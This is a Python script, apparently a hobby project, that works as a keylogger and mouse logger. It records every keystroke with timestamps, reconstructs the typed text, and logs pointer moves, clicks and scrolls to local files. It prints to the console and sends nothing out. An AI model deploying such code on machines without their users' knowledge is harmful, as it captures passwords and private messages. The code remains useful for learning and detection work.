from pynput import keyboard, mouse
from datetime import datetime
import sys
import threading

#----------------------------keyboard-----------------------------
#-----------------------------------------------------------------

Allkeylogsfile = open("AllLoggedKeys.txt", 'a')
keyWordslogs = open("ActualDisplay.txt", 'a')
keys = []
Actual = []
keys.append("------------------------------------------------------------------\n")
Actual.append("------------------------------------------------------------------\n")

Excluded_Keys = {
    keyboard.Key.shift_l, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, 
    keyboard.Key.alt_l, keyboard.Key.alt_r, keyboard.Key.cmd, keyboard.Key.tab, 
    keyboard.Key.caps_lock, keyboard.Key.f1, keyboard.Key.f2, keyboard.Key.f3, 
    keyboard.Key.f4, keyboard.Key.f5, keyboard.Key.f6, keyboard.Key.f7, 
    keyboard.Key.f8, keyboard.Key.f9, keyboard.Key.f10, keyboard.Key.f11, 
    keyboard.Key.f12, keyboard.Key.print_screen, keyboard.Key.scroll_lock, 
    keyboard.Key.pause, keyboard.Key.insert, keyboard.Key.home, 
    keyboard.Key.page_up, keyboard.Key.page_down, keyboard.Key.end, 
    keyboard.Key.delete, keyboard.Key.up, keyboard.Key.down, keyboard.Key.left, 
    keyboard.Key.right, keyboard.Key.media_volume_up, 
    keyboard.Key.media_volume_down, keyboard.Key.media_play_pause, 
    keyboard.Key.esc, keyboard.Key.shift_r,keyboard.Key.num_lock
}

def get_timestamp():
    return datetime.now().strftime('%Y-%m-%d %H:%M:%S')


def pressed(key):
    global keys, Actual
    timestamp = get_timestamp()
    try:
        print(f'{key.char} pressed at {timestamp}')
        keys.append(f'{timestamp} - {key.char}')
        Actual.append(f'{key.char}')
    except AttributeError:
        if key == keyboard.Key.space:
            print(f'Space key pressed at {timestamp}')
            keys.append(f'{timestamp} - <{key}>')
            Actual.append(f' ')
        elif key == keyboard.Key.enter:
            print(f'Enter key pressed at {timestamp}')
            keys.append(f'{timestamp} - <{key}>')
            Actual.append(f'\n')
        else:
            print(f'Special key {key} pressed at {timestamp}')
            keys.append(f'{timestamp} - <{key}>')
            if key in Excluded_Keys:
                return
            elif key == keyboard.Key.backspace and Actual:
                Actual.pop()
            else:
                Actual.append(f'<{key}>')

def released(key):
    timestamp = get_timestamp()
    print(f'{key} released at {timestamp}')
    if key == keyboard.Key.esc:
        # Stop both keyboard and mouse listeners
        keyboard_listener.stop()
        mouse_listener.stop()
        write_File()
        write_File_mouse()
        print("Exiting program...")
        sys.exit() 


def write_File():
    global keys, Actual
    for key in keys:
        Allkeylogsfile.write(str(key))
        Allkeylogsfile.write("\n")
    keys.clear()
    Actual.append("\n")
    for key in Actual:
        keyWordslogs.write(str(key))    
    Actual.clear()
    
#------------------------------------------------------------
#---------------------------------Mouse----------------------
#------------------------------------------------------------

Mouselogs = []
Mouselogs.append("------------------------------------------------------------------\n")
MouselogsFile = open("Mouse_Logs.txt", 'a')

def move(x, y):
    timestamp = get_timestamp()
    log = f'{timestamp} - Pointer moved to {(x, y)}'
    print(log)
    Mouselogs.append(log)

def click(x, y, button, pressed):
    timestamp = get_timestamp()
    log = f'{timestamp} - {"Pressed" if pressed else "Released"} at {(x, y)}'
    print(log)
    Mouselogs.append(log)
    if not pressed:
        write_File_mouse()

def scroll(x, y, dx, dy):
    timestamp = get_timestamp()
    log = f'{timestamp} - Scrolled {"down" if dy < 0 else "up"} at {(x, y)}'
    print(log)
    Mouselogs.append(log)

def write_File_mouse():
    for move in Mouselogs:
        MouselogsFile.write(str(move))
        MouselogsFile.write("\n")
    Mouselogs.clear()


#Threading
def keyboard_thread():
    global keyboard_listener
    keyboard_listener = keyboard.Listener(on_press=pressed, on_release=released)
    keyboard_listener.start()
    keyboard_listener.join()
    
def mouse_thread():
    global mouse_listener
    mouse_listener = mouse.Listener(on_move=move, on_click=click, on_scroll=scroll)
    mouse_listener.start()
    mouse_listener.join()


keyboard_thread_obj = threading.Thread(target=keyboard_thread, daemon=True)
mouse_thread_obj = threading.Thread(target=mouse_thread, daemon=True)

keyboard_thread_obj.start()
mouse_thread_obj.start()


keyboard_thread_obj.join()
mouse_thread_obj.join()

MouselogsFile.close()
Allkeylogsfile.close()
keyWordslogs.close()